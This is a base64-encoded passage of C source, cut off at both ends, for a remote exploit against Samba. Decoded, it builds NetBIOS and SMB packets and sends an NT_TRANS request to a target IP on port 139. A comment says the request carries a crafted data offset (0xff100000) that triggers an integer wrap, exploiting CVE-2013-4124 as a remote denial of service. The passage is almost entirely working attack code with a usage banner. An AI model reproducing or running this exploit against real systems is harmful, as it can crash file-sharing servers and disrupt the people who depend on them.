LCBzaXplb2YgKHVpbnQzMikpOw0KfQ0KDQovKg0Kc3RydWN0IHRjb254X3JlcXVlc3RfaGVhZGVyDQp7IHVpbnQ4IHdvcmRjb3VudCwgeGNvbW1hbmQsIHhyZXNlcnZlZCwgeG9mZnNldFsyXSwgZmxhZ3NbMl0sIHBhc3N3ZGxlblsyXSwgYnl0ZWNvdW50WzJdOw0KIC0tIHVpbnQxNiBieXRlY291bnQgZ2VlZnQgbGVuZ3RlIHZhbiB2b2xnZW5kZSBmaWVsZHMgYWFuOiBjaGFyIHBhc3N3b3JkW10sIHBhdGhbXSwgc2VydmljZVtdOw0KfTsgKi8NCnZvaWQgY29uc3RydWN0X3Rjb254X2hlYWRlcihjaGFyICpwdHIpDQp7IHN0cnVjdCB0Y29ueF9yZXF1ZXN0X2hlYWRlciAqdHhfaGRyID0gKHN0cnVjdCB0Y29ueF9yZXF1ZXN0X2hlYWRlciAqKXB0cjsNCiB1aW50MTYgcGFzc3dkbGVuID0gMSwgYnl0ZWNvdW50Ow0KIGNoYXIgKmRhdGE7DQoNCiBtZW1zZXQodHhfaGRyLCAnXDAnLCBzaXplb2YgKHN0cnVjdCB0Y29ueF9yZXF1ZXN0X2hlYWRlcikpOw0KDQogYnl0ZWNvdW50ID0gc3RybGVuKHRjb254X3NlcnZlcm5hbWUpICsgMTU7IA0KDQogaWYgKChkYXRhID0gbWFsbG9jKGJ5dGVjb3VudCkpID09IE5VTEwpDQogeyBmcHJpbnRmKHN0ZGVyciwgIm1hbGxvYygpIGZhaWxlZCwgYWJvcnRpbmchXG4iKTsNCiBleGl0KC0xKTsNCiB9DQogbWVtY3B5KGRhdGEsICJceDAwXHg1Y1x4NWMiLCAzKTsNCiBtZW1jcHkoZGF0YSArIDMsIHRjb254X3NlcnZlcm5hbWUsIHN0cmxlbih0Y29ueF9zZXJ2ZXJuYW1lKSk7DQogbWVtY3B5KGRhdGEgKyAzICsgc3RybGVuKHRjb254X3NlcnZlcm5hbWUpLCAiXHg1Y0lQQ1x4MjRceDAwXHgzZlx4M2ZceDNmXHgzZlx4M2ZceDAwIiwgMTIpOw0KDQogdHhfaGRyLT53b3JkY291bnQgPSA0Ow0KIHR4X2hkci0+eGNvbW1hbmQgPSAweGZmOw0KDQogbWVtY3B5KCZ0eF9oZHItPnBhc3N3ZGxlbiwgJnBhc3N3ZGxlbiwgc2l6ZW9mICh1aW50MTYpKTsNCiBtZW1jcHkoJnR4X2hkci0+Ynl0ZWNvdW50LCAmYnl0ZWNvdW50LCBzaXplb2YgKHVpbnQxNikpOw0KDQogbWVtY3B5KHB0ciArIHNpemVvZiAoc3RydWN0IHRjb254X3JlcXVlc3RfaGVhZGVyKSwgZGF0YSwgYnl0ZWNvdW50KTsNCn0NCg0Kdm9pZCBuYnRfc2Vzc2lvbl9yZXF1ZXN0KGludCBmZCwgY2hhciAqY2xpZW50bmFtZSwgY2hhciAqc2VydmVybmFtZSkNCnsgDQogIGNoYXIgKmNuLCAqc247DQogIGNoYXIgcGFja2V0W3NpemVvZiAoc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlcikgKyAoMzQgKiAyKV07DQoNCiAgY29uc3RydWN0X25idF9zZXNzaW9uX2hlYWRlcihwYWNrZXQsIFNNQl9TRVNTSU9OUkVRLCAwLCBzaXplb2YgKHBhY2tldCkgLSBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpKTsNCg0KICB0Y29ueF9zZXJ2ZXJuYW1lID0gc2VydmVybmFtZTsNCg0KICBzbiA9IG5ldGJpb3NfZW5jb2RlX25hbWUoc2VydmVybmFtZSwgMHgyMCk7DQogIGNuID0gbmV0Ymlvc19lbmNvZGVfbmFtZShjbGllbnRuYW1lLCAweDAwKTsNCg0KICBtZW1jcHkocGFja2V0ICsgc2l6ZW9mIChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyKSwgc24sIDM0KTsNCiAgbWVtY3B5KHBhY2tldCArIChzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgMzQpLCBjbiwgMzQpOw0KDQogIHdyaXRlKGZkLCBwYWNrZXQsIHNpemVvZiAocGFja2V0KSk7DQogIGNsb3NlKGZkKTsNCg0KICBmcmVlKGNuKTsNCiAgZnJlZShzbik7DQp9DQoNCnZvaWQgcHJvY2Vzc19uYnRfc2Vzc2lvbl9yZXBseShpbnQgZmQpDQp7IHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIgbmJ0X2hkcjsNCiBjaGFyICplcnJvcm1zZzsNCiB1aW50OCBlcnJvcmNvZGU7DQogaW50IHNpemUsIGxlbiA9IDA7DQoNCiBpZiAoKHNpemUgPSByZWFkKGZkLCAmbmJ0X2hkciwgc2l6ZW9mIChuYnRfaGRyKSkpID09IC0xKQ0KIHsgY2xvc2UoZmQpOw0KIGZwcmludGYoc3RkZXJyLCAicmVhZCgpIGZhaWxlZCwgcmVhc29uOiAnJXMnIChjb2RlICVpKVxuIiwgc3RyZXJyb3IoZXJybm8pLCBlcnJubyk7IA0KIGV4aXQoLWVycm5vKTsNCiB9DQogaWYgKHNpemUgIT0gc2l6ZW9mIChuYnRfaGRyKSkNCiB7IGNsb3NlKGZkKTsNCiBmcHJpbnRmKHN0ZGVyciwgInJlYWQoKSBhIGJyb2tlbiBwYWNrZXQsIGFib3J0aW5nLlxuIik7IA0KIGV4aXQoLTEpOw0KIH0NCiBtZW1jcHkoJmxlbiwgJm5idF9oZHIubGVuLCBzaXplb2YgKHVpbnQxNikpOw0KDQogaWYgKGxlbikNCiB7IHJlYWQoZmQsICh2b2lkICopJmVycm9yY29kZSwgMSk7IA0KIGNsb3NlKGZkKTsNCiBzd2l0Y2ggKGVycm9yY29kZSkNCiB7IGNhc2UgMHg4MCA6IGVycm9ybXNnID0gIk5vdCBsaXN0ZW5pbmcgb24gY2FsbGVkIG5hbWUiOyBicmVhazsNCiAgY2FzZSAweDgxIDogZXJyb3Jtc2cgPSAiTm90IGxpc3RlbmluZyBmb3IgY2FsbGluZyBuYW1lIjsgYnJlYWs7DQogIGNhc2UgMHg4MiA6IGVycm9ybXNnID0gIkNhbGxlZCBuYW1lIG5vdCBwcmVzZW50IjsgYnJlYWs7DQogIGNhc2UgMHg4MyA6IGVycm9ybXNnID0gIkNhbGxlZCBuYW1lIHByZXNlbnQsIGJ1dCBpbnN1ZmZpY2llbnQgcmVzb3VyY2VzIjsgYnJlYWs7DQogIGNhc2UgMHg4ZiA6IGVycm9ybXNnID0gIlVuc3BlY2lmaWVkIGVycm9yIjsgYnJlYWs7DQogIGRlZmF1bHQgOiBlcnJvcm1zZyA9ICJVbnNwZWNpZmllZCBlcnJvciAodW5rbm93biBlcnJvciBjb2RlIHJlY2VpdmVkISkiOyBicmVhazsNCiB9DQogZnByaW50ZihzdGRlcnIsICJzZXNzaW9uIHJlcXVlc3QgZGVuaWVkLCByZWFzb246ICclcycgKGNvZGUgJWkpXG4iLCBlcnJvcm1zZywgZXJyb3Jjb2RlKTsNCiBleGl0KC0xKTsNCiB9DQogcHJpbnRmKCJzZXNzaW9uIHJlcXVlc3QgZ3JhbnRlZFxuIik7DQp9DQoNCnZvaWQgbmVncHJvdF9yZXF1ZXN0KGludCBmZCkNCnsgc3RydWN0IHZhcmlhYmxlX2RhdGFfaGVhZGVyIGRhdGE7DQogY2hhciBkaWFsZWN0c1tdID0gIlx4MlBDIE5FVFdPUksgUFJPR1JBTSAxLjBceDBceDJNSUNST1NPRlQgTkVUV09SS1MgMS4wM1x4MFx4Mk1JQ1JPU09GVCBORVRXT1JLUyAzLjBceDBceDJMQU5NQU4xLjBceDAiIFwNCiAiXHgyTE0xLjJYMDAyXHgwXHgyU2FtYmFceDBceDJOVCBMQU5NQU4gMS4wXHgwXHgyTlQgTE0gMC4xMlx4MFx4MiIiRkxBVExJTkUnUyBLV0FBRFdBQVIiOyANCiBjaGFyIHBhY2tldFtzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgc2l6ZW9mIChzdHJ1Y3Qgc21iX2Jhc2VfaGVhZGVyKSArIHNpemVvZiAoZGF0YSkgKyBzaXplb2YgKGRpYWxlY3RzKV07DQogaW50IGRsZW4gPSBodG9ucyhzaXplb2YgKGRpYWxlY3RzKSk7DQoNCiBtZW1zZXQoJmRhdGEsICdcMCcsIHNpemVvZiAoZGF0YSkpOw0KIGNvbnN0cnVjdF9uYnRfc2Vzc2lvbl9oZWFkZXIocGFja2V0LCBTTUJfU0VTU0lPTiwgMCwgc2l6ZW9mIChwYWNrZXQpIC0gc2l6ZW9mIChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyKSk7DQogcGlkID0gZ2V0cGlkKCk7DQogY29uc3RydWN0X3NtYl9iYXNlX2hlYWRlcihwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpLCBTTUJfTkVHUFJPVCwgOCwgMSwgMCwgcGlkLCAwLCAxKTsNCg0KIG1lbWNweSgmZGF0YS5ieXRlY291bnQsICZkbGVuLCBzaXplb2YgKHVpbnQxNikpOw0KDQogbWVtY3B5KHBhY2tldCArIChzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgc2l6ZW9mIChzdHJ1Y3Qgc21iX2Jhc2VfaGVhZGVyKSksICZkYXRhLCBzaXplb2YgKGRhdGEpKTsNCiBtZW1jcHkocGFja2V0ICsgKHNpemVvZiAoc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlcikgKyBzaXplb2YgKHN0cnVjdCBzbWJfYmFzZV9oZWFkZXIpICsgc2l6ZW9mIChkYXRhKSksIA0KIGRpYWxlY3RzLCBzaXplb2YgKGRpYWxlY3RzKSk7DQoNCiBpZiAod3JpdGUoZmQsIHBhY2tldCwgc2l6ZW9mIChwYWNrZXQpKSA9PSAtMSkNCiB7IGNsb3NlKGZkKTsNCiBmcHJpbnRmKHN0ZGVyciwgIndyaXRlKCkgZmFpbGVkLCByZWFzb246ICclcycgKGNvZGUgJWkpXG4iLCBzdHJlcnJvcihlcnJubyksIGVycm5vKTsgDQogZXhpdCgtZXJybm8pOw0KIH0NCn0NCg0Kdm9pZCBwcm9jZXNzX25lZ3Byb3RfcmVwbHkoaW50IGZkKQ0KeyBzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyICpuYnRfaGRyOw0KIHN0cnVjdCBzbWJfYmFzZV9oZWFkZXIgKmJhc2VfaGRyOw0KIHN0cnVjdCBuZWdwcm90X3JlcGx5X2hlYWRlciAqbnBfcmVwbHlfaGRyOw0KIGNoYXIgcGFja2V0WzEwMjRdOw0KIGludCBzaXplOw0KIHVpbnQxNiBwaWRfcmVwbHk7DQoNCiBuYnRfaGRyID0gKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIgKilwYWNrZXQ7DQogYmFzZV9oZHIgPSAoc3RydWN0IHNtYl9iYXNlX2hlYWRlciAqKShwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpKTsNCiBucF9yZXBseV9oZHIgPSAoc3RydWN0IG5lZ3Byb3RfcmVwbHlfaGVhZGVyICopKHBhY2tldCArIChzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgDQogc2l6ZW9mIChzdHJ1Y3Qgc21iX2Jhc2VfaGVhZGVyKSkpOw0KDQogaWYgKChzaXplID0gcmVhZChmZCwgcGFja2V0LCBzaXplb2YgKHBhY2tldCkpKSA9PSAtMSkNCiB7IGNsb3NlKGZkKTsNCiBmcHJpbnRmKHN0ZGVyciwgInJlYWQoKSBmYWlsZWQsIHJlYXNvbjogJyVzJyAoY29kZSAlaSlcbiIsIHN0cmVycm9yKGVycm5vKSwgZXJybm8pOyANCiBleGl0KC1lcnJubyk7DQogfQ0KDQogbWVtY3B5KCZwaWRfcmVwbHksICZiYXNlX2hkci0+cGlkLCBzaXplb2YgKHVpbnQxNikpOw0KIG1lbWNweSgmc2Vzc2lvbmlkLCAmbnBfcmVwbHlfaGRyLT5zZXNzaW9uaWQsIHNpemVvZiAodWludDMyKSk7DQogaWYgKGJhc2VfaGRyLT5jb21tYW5kICE9IFNNQl9ORUdQUk9UIHx8IG5wX3JlcGx5X2hkci0+d29yZGNvdW50ICE9IDE3IHx8IHBpZF9yZXBseSAhPSBwaWQpDQogeyBjbG9zZShmZCk7DQogZnByaW50ZihzdGRlcnIsICJwcm90b2NvbCBuZWdvdGlhdGlvbiBmYWlsZWRcbiIpOw0KIGV4aXQoLTEpOw0KIH0NCg0KIHByaW50ZigicHJvdG9jb2wgbmVnb3RpYXRpb24gY29tcGxldGVcbiIpOw0KfQ0KDQp2b2lkIHNlc3NzZXR1cHhfcmVxdWVzdChpbnQgZmQpDQp7IHVpbnQ4IGRhdGFbXSA9ICJceDEyXHgwXHgwXHgwXHg1NVx4NmVceDY5XHg3OFx4MDBceDUzXHg2MVx4NmRceDYyXHg2MSI7DQogY2hhciBwYWNrZXRbc2l6ZW9mIChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyKSArIHNpemVvZiAoc3RydWN0IHNtYl9iYXNlX2hlYWRlcikgKyANCiBzaXplb2YgKHN0cnVjdCBzZXNzc2V0dXB4X3JlcXVlc3RfaGVhZGVyKSArIHNpemVvZiAoZGF0YSldOw0KIGludCBzaXplOw0KDQogY29uc3RydWN0X25idF9zZXNzaW9uX2hlYWRlcihwYWNrZXQsIFNNQl9TRVNTSU9OLCAwLCBzaXplb2YgKHBhY2tldCkgLSBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpKTsNCiBjb25zdHJ1Y3Rfc21iX2Jhc2VfaGVhZGVyKHBhY2tldCArIHNpemVvZiAoc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlciksIFNNQl9TRVNTU0VUVVBYLCA4LCAxLCAwLCBwaWQsIDAsIDEpOw0KIGNvbnN0cnVjdF9zZXNzc2V0dXB4X2hlYWRlcihwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgc2l6ZW9mIChzdHJ1Y3Qgc21iX2Jhc2VfaGVhZGVyKSk7DQogbWVtY3B5KHBhY2tldCArIHNpemVvZiAoc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlcikgKyBzaXplb2YgKHN0cnVjdCBzbWJfYmFzZV9oZWFkZXIpICsgDQogc2l6ZW9mIChzdHJ1Y3Qgc2Vzc3NldHVweF9yZXF1ZXN0X2hlYWRlciksICZkYXRhLCBzaXplb2YgKGRhdGEpKTsNCg0KIGlmICgoc2l6ZSA9IHdyaXRlKGZkLCBwYWNrZXQsIHNpemVvZiAocGFja2V0KSkpID09IC0xKQ0KIHsgY2xvc2UoZmQpOw0KIGZwcmludGYoc3RkZXJyLCAid3JpdGUoKSBmYWlsZWQsIHJlYXNvbjogJyVzJyAoY29kZSAlaSlcbiIsIHN0cmVycm9yKGVycm5vKSwgZXJybm8pOyANCiBleGl0KC1lcnJubyk7DQogfQ0KIGlmIChzaXplICE9IHNpemVvZiAocGFja2V0KSkNCiB7IGNsb3NlKGZkKTsNCiBmcHJpbnRmKHN0ZGVyciwgImNvdWxkbid0IHdyaXRlIGVudGlyZSBwYWNrZXQsIGFib3J0aW5nIVxuIik7DQogZXhpdCgtMSk7DQogfQ0KfQ0KDQp2b2lkIHByb2Nlc3Nfc2Vzc3NldHVweF9yZXBseShpbnQgZmQpDQp7IHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIgKm5idF9oZHI7DQogc3RydWN0IHNtYl9iYXNlX2hlYWRlciAqYmFzZV9oZHI7DQogc3RydWN0IHNlc3NzZXR1cHhfcmVwbHlfaGVhZGVyICpzeF9oZHI7DQogY2hhciBwYWNrZXRbMTAyNF07DQogaW50IHNpemUsIGxlbjsNCg0KIGlmICgoc2l6ZSA9IHJlYWQoZmQsIHBhY2tldCwgc2l6ZW9mIChwYWNrZXQpKSkgPT0gLTEpDQogeyBjbG9zZShmZCk7DQogZnByaW50ZihzdGRlcnIsICJyZWFkKCkgZmFpbGVkLCByZWFzb246ICclcycgKGNvZGUgJWkpXG4iLCBzdHJlcnJvcihlcnJubyksIGVycm5vKTsgDQogZXhpdCgtZXJybm8pOw0KIH0NCg0KIG5idF9oZHIgPSAoc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlciAqKXBhY2tldDsNCiBiYXNlX2hkciA9IChzdHJ1Y3Qgc21iX2Jhc2VfaGVhZGVyICopKHBhY2tldCArIHNpemVvZiAoc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlcikpOw0KIHN4X2hkciA9IChzdHJ1Y3Qgc2Vzc3NldHVweF9yZXBseV9oZWFkZXIgKikocGFja2V0ICsgc2l6ZW9mIChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyKSArIHNpemVvZiAoc3RydWN0IHNtYl9iYXNlX2hlYWRlcikpOw0KDQogbWVtY3B5KCZsZW4sICZuYnRfaGRyLT5sZW4sIHNpemVvZiAodWludDE2KSk7DQogbWVtY3B5KCZ1aWQsICZiYXNlX2hkci0+dWlkLCBzaXplb2YgKHVpbnQxNikpOw0KDQogaWYgKHN4X2hkci0+eGNvbW1hbmQgIT0gMHhmZiAmJiBzeF9oZHItPndvcmRjb3VudCAhPSAzKQ0KIHsgY2xvc2UoZmQpOw0KIGZwcmludGYoc3RkZXJyLCAic2Vzc2lvbiBzZXR1cCBmYWlsZWRcbiIpOw0KIGV4aXQoLTEpOw0KIH0NCg0KIHByaW50Zigic2Vzc2lvbiBzZXR1cCBjb21wbGV0ZSwgZ290IGFzc2lnbmVkIHVpZCAlaVxuIiwgdWlkKTsNCn0NCg0Kdm9pZCB0Y29ueF9yZXF1ZXN0KGludCBmZCkNCnsgDQogY2hhciAqcGFja2V0Ow0KIGludCBzaXplLCBwa3RzaXplID0gc2l6ZW9mIChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyKSArIHNpemVvZiAoc3RydWN0IHNtYl9iYXNlX2hlYWRlcikgKw0KIHNpemVvZiAoc3RydWN0IHRjb254X3JlcXVlc3RfaGVhZGVyKSArIHN0cmxlbih0Y29ueF9zZXJ2ZXJuYW1lKSArIDE1Ow0KDQogaWYgKChwYWNrZXQgPSBtYWxsb2MocGt0c2l6ZSkpID09IE5VTEwpDQogeyBjbG9zZShmZCk7DQogZnByaW50ZihzdGRlcnIsICJtYWxsb2MoKSBmYWlsZWQsIGFib3J0aW5nIVxuIik7DQogZXhpdCgtMSk7DQogfQ0KDQogY29uc3RydWN0X25idF9zZXNzaW9uX2hlYWRlcihwYWNrZXQsIFNNQl9TRVNTSU9OLCAwLCBwa3RzaXplIC0gc2l6ZW9mIChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyKSk7DQogY29uc3RydWN0X3NtYl9iYXNlX2hlYWRlcihwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpLCBTTUJfVENPTlgsIDgsIDEsIDAsIHBpZCwgdWlkLCAxKTsNCiBjb25zdHJ1Y3RfdGNvbnhfaGVhZGVyKHBhY2tldCArIHNpemVvZiAoc3RydWN0IG5idF9zZXNzaW9uX2hlYWRlcikgKyBzaXplb2YgKHN0cnVjdCBzbWJfYmFzZV9oZWFkZXIpKTsNCg0KIGlmICgoc2l6ZSA9IHdyaXRlKGZkLCBwYWNrZXQsIHBrdHNpemUpKSA9PSAtMSkNCiB7IGNsb3NlKGZkKTsNCiBmcHJpbnRmKHN0ZGVyciwgIndyaXRlKCkgZmFpbGVkLCByZWFzb246ICclcycgKGNvZGUgJWkpXG4iLCBzdHJlcnJvcihlcnJubyksIGVycm5vKTsgDQogZXhpdCgtZXJybm8pOw0KIH0NCg0KIGZyZWUocGFja2V0KTsNCg0KIGlmIChzaXplICE9IHBrdHNpemUpDQogeyBjbG9zZShmZCk7DQogZnByaW50ZihzdGRlcnIsICJjb3VsZG4ndCB3cml0ZSBlbnRpcmUgcGFja2V0LCBhYm9ydGluZyFcbiIpOw0KIGV4aXQoLTEpOw0KIH0gDQp9DQoNCnZvaWQgcHJvY2Vzc190Y29ueF9yZXBseShpbnQgZmQpDQp7IHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIgKm5idF9oZHI7DQogc3RydWN0IHNtYl9iYXNlX2hlYWRlciAqYmFzZV9oZHI7DQogc3RydWN0IHRjb254X3JlcGx5X2hlYWRlciAqdHhfaGRyOw0KIGNoYXIgcGFja2V0WzEwMjRdOw0KIGludCBzaXplLCBieXRlY291bnQ7DQogDQogaWYgKChzaXplID0gcmVhZChmZCwgcGFja2V0LCBzaXplb2YgKHBhY2tldCkpKSA9PSAtMSkNCiB7IGNsb3NlKGZkKTsNCiBmcHJpbnRmKHN0ZGVyciwgInJlYWQoKSBmYWlsZWQsIHJlYXNvbjogJyVzJyAoY29kZSAlaSlcbiIsIHN0cmVycm9yKGVycm5vKSwgZXJybm8pOw0KIGV4aXQoLWVycm5vKTsNCiB9DQoNCiBuYnRfaGRyID0gKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIgKilwYWNrZXQ7DQogYmFzZV9oZHIgPSAoc3RydWN0IHNtYl9iYXNlX2hlYWRlciAqKShwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpKTsNCiB0eF9oZHIgPSAoc3RydWN0IHRjb254X3JlcGx5X2hlYWRlciAqKShwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgc2l6ZW9mIChzdHJ1Y3Qgc21iX2Jhc2VfaGVhZGVyKSk7DQoNCiBtZW1jcHkoJnRpZCwgJmJhc2VfaGRyLT50aWQsIHNpemVvZiAodWludDE2KSk7DQogbWVtY3B5KCZieXRlY291bnQsICZ0eF9oZHItPmJ5dGVjb3VudCwgc2l6ZW9mICh1aW50MTYpKTsNCg0KIHByaW50ZigidHJlZSBjb25uZWN0IGNvbXBsZXRlLCBnb3QgYXNzaWduZWQgdGlkICVpXG4iLCB0aWQpOw0KfQ0KDQp2b2lkIG50dHJhbnNfcmVxdWVzdChpbnQgZmQpIHsgDQogIC8vIHBhY2tldCA9IG5idCBzZXNzaW9uIGhlYWRlciArIHNtYiBiYXNlIGhlYWRlciArIG50dHJhbnMgaGVhZGVyIQ0KICBjaGFyIHBhY2tldFtzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgDQogICAgICAgIHNpemVvZiAoc3RydWN0IHNtYl9iYXNlX2hlYWRlcikgKyANCiAgICAgICAgc2l6ZW9mIChzdHJ1Y3QgbnR0cmFuc19wcmltYXJ5X3JlcXVlc3RfaGVhZGVyKV07DQogIHN0cnVjdCBudHRyYW5zX3ByaW1hcnlfcmVxdWVzdF9oZWFkZXIgbnR0cmFuc19oZHI7ICAvLyBudHRyYW5zIGhlYWRlciENCiAgaW50IHNpemU9MDsNCiAgaW50IGZ1bmN0aW9uID0gU01CX05UVFJBTlNDUkVBVEU7ICAvLyBOVFRSQU5TQ1JFQVRFIQ0KICBpbnQgdG90YWxwYXJhbWNvdW50ID0gVE9UQUxDT1VOVDsNCiAgaW50IHRvdGFsZGF0YWNvdW50ID0gMDsNCiAgdWludDggc2V0dXBjb3VudCA9IDA7DQoNCiAgbWVtc2V0KCZudHRyYW5zX2hkciwgMCwgc2l6ZW9mIG50dHJhbnNfaGRyKTsNCg0KICAvLyBjb25zdHJ1Y3QgbmJ0IHNlc3Npb24gaGVhZGVyDQogIGNvbnN0cnVjdF9uYnRfc2Vzc2lvbl9oZWFkZXIocGFja2V0LCBTTUJfU0VTU0lPTiwgMCwgc2l6ZW9mIChwYWNrZXQpIC0gc2l6ZW9mIChzdHJ1Y3QgbmJ0X3Nlc3Npb25faGVhZGVyKSk7DQogIC8vIGNvbnN0cnVjdCBzbWIgYmFzZSBoZWFkZXINCiAgY29uc3RydWN0X3NtYl9iYXNlX2hlYWRlcihwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpLCBTTUJfTlRUUkFOUywgOCwgMSwgdGlkLCBwaWQsIHVpZCwgMSk7DQoNCiAgLy8gY29uc3RydWN0IG50dHJhbnMgaGVhZGVyDQogIG50dHJhbnNfaGRyLnBhcmFtb2Zmc2V0WzBdID0gJ1x4MDAnOw0KICBudHRyYW5zX2hkci5wYXJhbW9mZnNldFsxXSA9ICdceDAwJzsNCiAgbnR0cmFuc19oZHIucGFyYW1vZmZzZXRbMl0gPSAnXHgxMCc7DQogIG50dHJhbnNfaGRyLnBhcmFtb2Zmc2V0WzNdID0gJ1x4ZmYnOw0KICBudHRyYW5zX2hkci5kYXRhb2Zmc2V0WzBdID0gJ1x4MDAnOyAgLy8gWFhYIGRhdGEgb2Zmc2V0IDB4ZmYxMDAwMDAgdG8gaW50ZWdlciB3cmFwDQogIG50dHJhbnNfaGRyLmRhdGFvZmZzZXRbMV0gPSAnXHgwMCc7ICAvLyAgICB0aGUgb2Zmc2V0IGV4cGxvaXRzIHRoZSBzZWN1cml0eSBidWcgb2YgQ1ZFLTIwMTMtNDEyNA0KICBudHRyYW5zX2hkci5kYXRhb2Zmc2V0WzJdID0gJ1x4MTAnOyAgLy8gICAgICBzYW1iYSByZW1vdGUgZG9zDQogIG50dHJhbnNfaGRyLmRhdGFvZmZzZXRbM10gPSAnXHhmZic7DQoNCiAgbnR0cmFuc19oZHIud29yZGNvdW50ID0gMTkgKyBzZXR1cGNvdW50Ow0KICBtZW1jcHkoJm50dHJhbnNfaGRyLmZ1bmN0aW9uLCAmZnVuY3Rpb24sIHNpemVvZiAodWludDE2KSk7DQogIG1lbWNweSgmbnR0cmFuc19oZHIudG90YWxwYXJhbWNvdW50LCAmdG90YWxwYXJhbWNvdW50LCBzaXplb2YgKHVpbnQzMikpOw0KICBtZW1jcHkoJm50dHJhbnNfaGRyLnRvdGFsZGF0YWNvdW50LCAmdG90YWxkYXRhY291bnQsIHNpemVvZiAodWludDMyKSk7DQogIG1lbWNweShwYWNrZXQgKyBzaXplb2YgKHN0cnVjdCBuYnRfc2Vzc2lvbl9oZWFkZXIpICsgc2l6ZW9mIChzdHJ1Y3Qgc21iX2Jhc2VfaGVhZGVyKSwgJm50dHJhbnNfaGRyLCBzaXplb2YgbnR0cmFuc19oZHIpOw0KDQogIC8vIHNlbmQgc2FtYmEgcGFja2V0IQ0KICBzaXplID0gd3JpdGUoZmQsIHBhY2tldCwgc2l6ZW9mIChwYWNrZXQpKTsNCiAgY2xvc2UoZmQpOw0KDQp9DQoNCnN0YXRpYyBjaGFyIGJhbm5lcltdPXsNCiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX18gICAgX19fICAgICAgICAgICAgICBcbiIgXA0KIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyBfIFxcICAvIF8gXFwgICAgICAgICAgIFxuIiBcDQoiICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fICBfX3wgKF8pIHx8IHwgfCB8ICBfX18gICAgICAgXG4iIFwNCiIgICAgICAgICAgICAgICAgICAgICAgICAgICAgXFwgXFwvIC8gXFxfXy4gfHwgfCB8IHwgLyBfX3wgICBcbiIgXA0KIiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPiAgPCAgICAvIC8gfCB8X3wgfHwgKF9fICAgICAgIFxuIiBcDQoiICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fL1xcX1xcICAvXy8gICBcXF9fXy8gIFxcX19ffCAgXG4iIFwNCn07DQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgaW50IGZkOw0KICBzdHJ1Y3Qgc29ja2FkZHJfaW4gc19pbjsNCiAgY2hhciB0YXJnZXRfaXBbMTZdOw0KICBpbnQgc21iX3BvcnQ9MTM5Ow0KICAgIA0KDQogICAgcHJpbnRmKCIlc1xuXG5zYW1iYSBudHRyYW5zIHJlcGx5IGV4cGxvaXRcblxuIiwgYmFubmVyKTsNCg0KICBpZihhcmdjIDwgMil7DQogICAgZnByaW50ZihzdGRlcnIsICJzYW1iYSBudHRyYW5zIHJlcGx5IGV4cGxvaXQgVXNhZ2U6XG5cbi4vc2FtYmFfZXhwbG9pdCBbdGFyZ2V0IGlwIGFkZHJdXG5cbiIpOw0KICAgIGV4aXQoLTEpOw0KICB9DQoNCiAgc3RybmNweSh0YXJnZXRfaXAsIGFyZ3ZbMV0sIDE2KTsNCiAgDQogICAgbWVtc2V0KCZzX2luLCAwLCBzaXplb2YgKHNfaW4pKTsNCiAgICBzX2luLnNpbl9mYW1pbHkgPSBBRl9JTkVUOw0KICAgIHNfaW4uc2luX3BvcnQgPSBodG9ucyhzbWJfcG9ydCk7ICAvLyBzYW1iYSBwb3J0PTEzOS90Y3ANCiAgICBzX2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcih0YXJnZXRfaXApOw0KDQogICAgZmQgPSBzb2NrZXQoQUZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKTsNCiAgICBjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopJnNfaW4sIHNpemVvZiAoc19pbikpOw0KDQogIC8vIG5idChuZXRiaW9zIG92ZXIgdGNwaXAsIG5idHN0YXQpIHNlc3Npb24gcmVxdWVzdA0KICBuYnRfc2Vzc2lvbl9yZXF1ZXN0KGZkLCAiQk9TU0E